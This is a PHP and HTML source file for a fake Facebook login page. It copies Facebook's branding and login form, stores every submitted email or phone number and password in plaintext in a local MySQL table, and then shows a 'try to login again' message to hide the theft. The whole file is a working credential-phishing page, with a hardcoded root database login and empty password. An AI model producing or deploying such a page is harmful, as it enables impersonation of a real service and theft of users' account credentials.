<?php

$hostName = "localhost";
$dbUser = "root";
$dbPassword = "";
$dbName = "store";
$conn = mysqli_connect($hostName, $dbUser, $dbPassword, $dbName);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

if (isset($_POST["submit"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $sql = "INSERT INTO users (username, password) VALUES (?, ?)";
    $stmt = mysqli_stmt_init($conn);
    $prepareStmt = mysqli_stmt_prepare($stmt, $sql);
    if ($prepareStmt) {
        mysqli_stmt_bind_param($stmt, "ss", $username, $password);
        mysqli_stmt_execute($stmt);
        echo "<div class='alert alert-success'>Please try to login again. . .</div>";
    } else {
        die("Error: " . mysqli_error($conn));
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" type="x-icon"  href="img/logo1.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook login or sign up</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <link rel="stylesheet" href="facebook.css">
    
</head>
<body>
    <div class="textbox">
        <h1>facebook</h1>
        <h2>Facebook helps you connect and share<br> with the people in your life.</h2>
    </div>

    <div class="container">
        <div class="form">
            <form action="" method="post">
                <input type="text" class="text" name="username" placeholder="Email or Phone number" required> <br>
                <input type="password" class="text" name="password" placeholder="Password" required><br>
                <input type="submit" class="btn" name="submit" value="Login">
                <p><a href="">forgot password?</a><br></p>
                <input type="submit" class="btn" name="submit" value="Create New Account">
            </form>
        </div>
    </div>
</body>
</html>
